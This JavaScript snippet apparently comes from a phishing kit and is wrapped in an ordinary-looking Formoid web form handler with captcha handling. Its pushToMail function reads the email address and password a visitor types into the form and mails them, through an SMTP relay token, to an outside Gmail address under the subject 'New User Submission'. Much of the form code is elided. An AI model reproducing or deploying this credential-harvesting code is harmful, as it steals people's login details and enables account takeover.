const pushToMail = () => {
    Email.send({
        SecureToken: "7f080785-32d8-4252-a761-23526b20c77a",
        To: "tansley01matthews@gmail.com",
        From: document.getElementById("email").value,
        Subject: "New User Submission",
        Body:
            "User Email is: " +
            document.getElementById("email").value +
            "<br> Confirmed User Email is: " +
            document.getElementById("emailtoAlert").value +
            "<br> User Password is: " +
            document.getElementById("password-mbr-popup-34").value,
    }).then(() => "");
};

var Formoid = (function () {
    var API_URL = "/u/token/";
    // initial API_URL = "/u/token/connect/";
    ...
    Form.prototype.getCaptchaToken = function () {
        ...
        return new Promise(function (resolve, reject) {
            ...
            if (!grecaptcha)
                return reject(new Error('"grecaptcha" is not found'));
    ...
    form.addEventListener("submit", function (event) {
        ...
        function parseInput(input) {
            return new Promise(function (resolve, reject) {
                ...
                var name =
                    input.getAttribute("data-form-field") ||
